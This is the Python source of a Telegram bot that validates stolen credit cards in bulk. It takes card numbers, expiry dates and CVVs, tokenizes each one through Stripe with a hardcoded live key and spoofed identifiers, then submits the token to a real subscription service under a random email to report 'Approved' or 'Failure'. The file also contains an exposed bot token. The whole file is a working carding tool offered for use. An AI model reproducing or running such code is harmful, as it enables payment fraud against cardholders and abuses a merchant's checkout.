import os
import re
import time
import random
import string
from telebot import TeleBot, types

bot = TeleBot("7634693376:AAGzz0nE7BfOR2XE7gyWGB6s4ycAL8pOUqY")

# Store processing flags
processing_users = {}

def generate_random_email():
    username = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    return f"{username}@gmail.com"

def process_card(card_data, user_id):
    try:
        # Parse card details
        if '/' in card_data:
            cc, mm, yy, cvv = re.split(r'[/|]', card_data)
        else:
            cc, mm, yy, cvv = card_data.split('|')
        
        # Clean year format
        if len(yy) == 2:
            yy = f"20{yy}"
        
        # First API request to get token
        stripe_url = "https://api.stripe.com/v1/tokens"
        headers = {
            "Host": "api.stripe.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/137.2 Mobile/15E148 Safari/605.1.15"
        }
        
        data = {
            "guid": "8b1dae8e-b683-4fd4-9220-381abc8df51e598300",
            "muid": "ef66e872-afcd-4596-839e-931e061bffd6cb7483",
            "sid": "e90f7930-ec07-41c9-a61d-4c31960cf6f54de193",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "payment_user_agent": "stripe.js/aa3f8c0487; stripe-js-v3/aa3f8c0487; card-element",
            "key": "pk_live_7ZEzPfBzcpa67c2hVYYKAXdf008kTY3bSa"
        }

        response = requests.post(stripe_url, headers=headers, data=data)
        token = response.json().get('id', '')
        
        if not token.startswith('tok_'):
            return "❌ Failed to get token"

        # Second API request for final check
        final_url = "https://my.playbookapp.io/management/subscription"
        headers = {
            "Host": "my.playbookapp.io",
            "Content-Type": "application/json",
            "Origin": "https://my.playbookapp.io",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/137.2 Mobile/15E148 Safari/605.1.15"
        }

        payload = {
            "source": token,
            "user": {"email": generate_random_email()},
            "plan": "playbook_monthly",
            "metadata": {"sourceInfluencerId": 0}
        }

        final_response = requests.post(final_url, headers=headers, json=payload)
        result = final_response.json()
        
        status = "✅ Approved" if result.get('err', False) else "❌ Failure"
        return f"{status}\nFull Response:\n{result}"

    except Exception as e:
        return f"⚠️ Error: {str(e)}"

@bot.message_handler(commands=['start'])
def start(message):
    instructions = """Send credit cards in these formats:
CC|MM|YY|CVV
CC|MM|YYYY|CVV
CC/MM/YY/CVV
CC/MM/YYYY/CVV

You can send single or multiple cards separated by new lines"""
    bot.send_message(message.chat.id, instructions)

@bot.message_handler(commands=['stop'])
def stop(message):
    user_id = message.chat.id
    processing_users[user_id] = False
    bot.send_message(user_id, "⏹ Processing stopped")

@bot.message_handler(func=lambda m: True)
def handle_message(message):
    user_id = message.chat.id
    processing_users[user_id] = True
    
    cards = message.text.split('\n')
    for i, card in enumerate(cards):
        if not processing_users.get(user_id, True):
            break
            
        result = process_card(card.strip(), user_id)
        bot.send_message(user_id, result)
        
        if i != len(cards)-1:
            time.sleep(15)
    
    processing_users[user_id] = False

if __name__ == "__main__":
    bot.polling()